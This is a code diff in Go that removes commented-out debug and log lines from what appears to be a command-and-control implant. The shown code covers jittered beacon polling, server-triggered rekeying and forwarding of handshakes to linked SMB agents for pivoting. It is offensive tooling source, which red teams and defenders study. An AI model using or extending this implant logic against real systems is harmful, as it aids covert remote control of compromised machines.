@@ -472,10 +472,7 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 
 	// Check for rekey command (special status that doesn't require decryption)
 	// Debug: Print the compile-time MALLEABLE_REKEY_COMMAND value
-	//fmt.Printf("[DEBUG] MALLEABLE_REKEY_COMMAND compiled value: %q\n", MALLEABLE_REKEY_COMMAND)
-	//fmt.Printf("[DEBUG] response status from server: %q\n", responseStatus)
 	if responseStatus == MALLEABLE_REKEY_COMMAND {
-		//fmt.Println("[DEBUG] Received rekey command from server - MATCH FOUND!")
 
 		// Extract command DB ID for the rekey result
 		var commandDBID int
@@ -489,7 +486,6 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 		}
 
 		// Execute rekey command directly without decryption
-		//fmt.Println("[DEBUG] Executing rekey command...")
 
 		// Create result for the rekey command first (before triggering rekey)
 		rekeyResult := &CommandResult{
@@ -513,10 +509,8 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 		if rekeyInProgress.CompareAndSwap(false, true) {
 			go func() {
 				defer rekeyInProgress.Store(false)
-				//fmt.Println("[DEBUG] Starting rekey in background...")
 				if err := refreshHandshake(); err != nil {
 				} else {
-					//fmt.Println("[DEBUG] Rekey completed successfully")
 				}
 			}()
 		}
@@ -533,7 +527,6 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 
 	if linkRespVal, ok := responseMap[MALLEABLE_LINK_HANDSHAKE_RESP_FIELD]; ok {
 		if linkRespData, ok := linkRespVal.([]interface{}); ok {
-			// log.Printf("[LinkManager] Processing %d handshake responses before commands", len(linkRespData))
 			processLinkHandshakeResponses(linkRespData)
 		}
 	}
@@ -718,7 +711,6 @@ func processLinkHandshakeResponses(responses []interface{}) {
 		lm.mu.RUnlock()
 
 		if !exists || link == nil {
-			// log.Printf("[LinkManager] No link found for routing_id %s when forwarding handshake response", routingID)
 			continue
 		}
 
@@ -738,21 +730,16 @@ func processLinkHandshakeResponses(responses []interface{}) {
 		// Try to send regardless of IsActive - the SMB agent may be waiting with long timeout
 		link.mu.Lock()
 		if link.Conn != nil {
-			// log.Printf("[LinkManager] Forwarding handshake response to routing_id %s (IsActive=%v)", routingID, link.IsActive)
 			if err := writeMessage(link.Conn, data); err != nil {
-				// log.Printf("[LinkManager] Failed to send handshake response to %s: %v", routingID, err)
 			} else {
-				// log.Printf("[LinkManager] Successfully sent handshake response to routing_id %s", routingID)
 				link.LastSeen = time.Now()
 				// Re-activate link if it was marked inactive due to read timeout
 				// The handshake response completing successfully proves the pipe is still alive
 				if !link.IsActive {
 					link.IsActive = true
-					// log.Printf("[LinkManager] Re-activated link %s after successful handshake response", routingID)
 				}
 			}
 		} else {
-			// log.Printf("[LinkManager] Link %s has nil connection, cannot send handshake response", routingID)
 		}
 		link.mu.Unlock()
 	}
@@ -787,28 +774,22 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 		consecutiveErrors := 0
 		maxBackoffMultiplier := 5
 
-		// Add label for outer loop
 	pollingLoop:
 		for {
-			// Check for shutdown signal at the start of each iteration
 			select {
 			case <-pollingShutdown:
-				//fmt.Println("Polling shutdown signal received, exiting polling loop")
 				return
 			default:
-				// Continue with polling
 			}
 
-			// Get current sleep and jitter values at start of each iteration
 			baseSeconds, err := strconv.Atoi(sleep)
 			if err != nil {
-				baseSeconds = 30 // Default to 30 seconds if invalid
+				baseSeconds = 30
 			}
 
-			// Get current jitter value
 			jitterValue, err := strconv.ParseFloat(jitter, 64)
 			if err != nil {
-				jitterValue = 10.0 // Default to 10% if invalid
+				jitterValue = 10.0
 			}
 
 			nextInterval := calculateJitteredInterval(baseSeconds, jitterValue, r)
@@ -879,25 +860,17 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 				}
 			}
 
-			// Check for shutdown before sleep
 			select {
 			case <-pollingShutdown:
-				//fmt.Println("Polling shutdown requested before sleep, exiting...")
 				return
 			case <-time.After(nextInterval):
-				// Continue with next poll
 			}
 
-			// Perform the poll AFTER sleep
 			if err := doPoll(secureComms, customHeaders); err != nil {
-				// Check if this is a rekey in progress - if so, exit the entire goroutine
 				if err.Error() == E19 {
-					//fmt.Println("Rekey initiated, exiting current polling loop")
-					break pollingLoop // Break out of the outer for loop
+					break pollingLoop
 				}
-				// Check for decryption failures
 				if strings.Contains(err.Error(), E18) {
-					// Could trigger automatic rekey here if needed
 				}
 				consecutiveErrors++
 			} else {
@@ -911,7 +884,6 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 
 // StopPolling signals the current polling routine to stop and waits for it to finish
 func StopPolling() {
-	//fmt.Println("Stopping current polling routine...")
 
 	pollingMutex.Lock()
 	if pollingShutdown != nil {
@@ -929,9 +901,7 @@ func StopPolling() {
 
 	select {
 	case <-done:
-		//fmt.Println("Polling routine stopped successfully")
 	case <-time.After(10 * time.Second):
-		//fmt.Println("Warning: Polling routine stop timed out after 10 seconds")
 	}
 
 	// Reset only the WaitGroup, NOT the channel
